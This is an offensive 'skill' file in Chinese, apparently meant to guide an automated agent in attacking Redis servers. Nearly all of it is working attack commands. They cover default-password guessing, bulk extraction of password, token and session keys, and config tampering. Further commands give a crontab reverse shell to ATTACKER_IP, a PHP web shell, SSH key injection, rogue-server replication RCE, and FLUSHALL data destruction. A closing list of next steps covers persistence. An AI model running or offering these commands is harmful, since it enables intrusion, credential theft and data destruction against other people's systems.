---
name: redis-attack
type: attack
category: database
platform: redis
severity: critical
---

# Redis 攻击技能

## 触发条件

- 发现 Redis 服务
- 可以连接到 Redis
- 用户要求"攻击 Redis"

## 前置检查

```bash
# 1. 测试连接
redis-cli -h redis.example.com -p 6379 PING

# 2. 获取 Redis 信息
redis-cli -h redis.example.com -p 6379 INFO

# 3. 检查认证
redis-cli -h redis.example.com -p 6379 AUTH ""
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试无密码连接
redis-cli -h redis.example.com -p 6379

# 2. 测试默认密码
# 常见默认: redis, password, 123456
for pass in "" "redis" "password" "123456"; do
  redis-cli -h redis.example.com -p 6379 -a $pass PING
done

# 3. 扫描 Redis 服务
nmap -p 6379 --script redis-info TARGET_IP
```

### 方法 2: 数据窃取

```bash
# 1. 列出所有键
redis-cli -h redis.example.com -p 6379 KEYS '*'

# 2. 获取所有键值对
for key in $(redis-cli -h redis.example.com -p 6379 KEYS '*'); do
  echo "=== $key ==="
  redis-cli -h redis.example.com -p 6379 GET "$key"
  echo ""
done > /tmp/redis-data.txt

# 3. 搜索敏感键
redis-cli -h redis.example.com -p 6379 KEYS '*password*'
redis-cli -h redis.example.com -p 6379 KEYS '*secret*'
redis-cli -h redis.example.com -p 6379 KEYS '*token*'
redis-cli -h redis.example.com -p 6379 KEYS '*session*'

# 4. 获取 Hash 数据
redis-cli -h redis.example.com -p 6379 HGETALL hash_key
```

### 方法 3: 配置篡改

```bash
# 1. 获取配置
redis-cli -h redis.example.com -p 6379 CONFIG GET '*'

# 2. 搜索敏感配置
redis-cli -h redis.example.com -p 6379 CONFIG GET '*requirepass*'
redis-cli -h redis.example.com -p 6379 CONFIG GET '*masterauth*'

# 3. 修改密码（如果有权限）
redis-cli -h redis.example.com -p 6379 CONFIG SET requirepass "newpassword"

# 4. 保存配置
redis-cli -h redis.example.com -p 6379 CONFIG REWRITE
```

### 方法 4: 代码执行（Redis < 5.0）

```bash
# 1. 通过 CONFIG 远程代码执行
redis-cli -h redis.example.com -p 6379 CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h redis.example.com -p 6379 CONFIG SET dbfilename root
redis-cli -h redis.example.com -p 6379 SET x "\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
redis-cli -h redis.example.com -p 6379 SAVE

# 2. 通过模块加载（Redis 4.0+）
# 生成恶意 .so 模块
gcc -shared -fPIC -o malicious.so malicious.c

# 3. 上传模块到目标
redis-cli -h redis.example.com -p 6379 MODULE LOAD /path/to/malicious.so

# 4. 主从复制 RCE（Redis 4.0+ 5.0）
# 使用 rogue redis server
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
./RedisModules-ExecuteCommand -ip redis.example.com -p 6379
```

### 方法 5: Web Shell 上传

```bash
# 1. 如果 Redis 配置了 Web 目录
redis-cli -h redis.example.com -p 6379 CONFIG SET dir /var/www/html
redis-cli -h redis.example.com -p 6379 CONFIG SET dbfilename shell.php
redis-cli -h redis.example.com -p 6379 SET x "<?php system($_GET['cmd']); ?>"
redis-cli -h redis.example.com -p 6379 SAVE

# 2. 访问 Web Shell
curl "http://target.com/shell.php?cmd=whoami"

# 3. 或使用 SSH 公钥
redis-cli -h redis.example.com -p 6379 CONFIG SET dir /root/.ssh/
redis-cli -h redis.example.com -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h redis.example.com -p 6379 SET x "\n\nssh-rsa AAAAB3... attacker@host\n\n"
redis-cli -h redis.example.com -p 6379 SAVE
```

### 方法 6: 主从复制利用

```bash
# 1. 如果是主从配置
# 可以作为恶意从服务器

# 2. 使用 redis-rogue-server
git clone https://github.com/0nise/redis-rogue-server
cd redis-rogue-server
python redis-rogue-server.py --rhost redis.example.com --rport 6379 \
  --lhost ATTACKER_IP --lport 8888

# 3. 通过 SYNC 命令获取数据
redis-cli -h redis.example.com -p 6379 SYNC
```

### 方法 7: Lua 脚本注入

```bash
# 1. 创建恶意 Lua 脚本
cat > malicious.lua <<'EOF'
return redis.call('CONFIG', 'SET', 'requirepass', 'p0wn3d')
EOF

# 2. 执行脚本
redis-cli -h redis.example.com -p 6379 --eval malicious.lua

# 3. 或直接执行 EVAL
redis-cli -h redis.example.com -p 6379 EVAL \
  "return redis.call('CONFIG','SET','requirepass','p0wn3d')" 0

# 4. 扫描键的脚本
redis-cli -h redis.example.com -p 6379 --eval scan.lua , match:*
```

### 方法 8: Pub/Sub 滥用

```bash
# 1. 监听所有频道
redis-cli -h redis.example.com -p 6379 PSUBSCRIBE '*'

# 2. 发布恶意消息
redis-cli -h redis.example.com -p 6379 PUBLISH channel_name "malicious_data"

# 3. 窃取其他客户端的消息
# 在另一个终端订阅
redis-cli -h redis.example.com -p 6379 SUBSCRIBE sensitive_channel
```

### 方法 9: 事务和数据操作

```bash
# 1. 创建事务
redis-cli -h redis.example.com -p 6379 MULTI
redis-cli -h redis.example.com -p 6379 GET password
redis-cli -h redis.example.com -p 6379 SET backdoor "true"
redis-cli -h redis.example.com -p 6379 EXEC

# 2. 批量删除数据
redis-cli -h redis.example.com -p 6379 DEL key1 key2 key3

# 3. 或使用 FLUSHDB
redis-cli -h redis.example.com -p 6379 FLUSHDB
redis-cli -h redis.example.com -p 6379 FLUSHALL
```

### 方法 10: 持久化文件利用

```bash
# 1. 获取 RDB 文件路径
redis-cli -h redis.example.com -p 6379 CONFIG GET dir
redis-cli -h redis.example.com -p 6379 CONFIG GET dbfilename

# 2. 触发 BGSAVE
redis-cli -h redis.example.com -p 6379 BGSAVE

# 3. 如果可以访问文件系统
# 下载 RDB 文件进行分析
scp user@redis.example.com:/var/lib/redis/dump.rdb /tmp/

# 4. 使用 rdbtool 解析
pip install rdbtools
rdb --command json /tmp/dump.rdb
```

## 验证成功

```bash
# 成功连接
redis-cli -h redis.example.com -p 6379 PING

# 成功列出键
redis-cli -h redis.example.com -p 6379 KEYS '*'

# 成功获取数据
redis-cli -h redis.example.com -p 6379 GET sensitive_key
```

## 下一步

1. 分析窃取的数据中的凭证
2. 通过 Redis 建立持久化
3. 利用 Redis 配置访问其他服务
4. 攻击使用 Redis 的应用程序
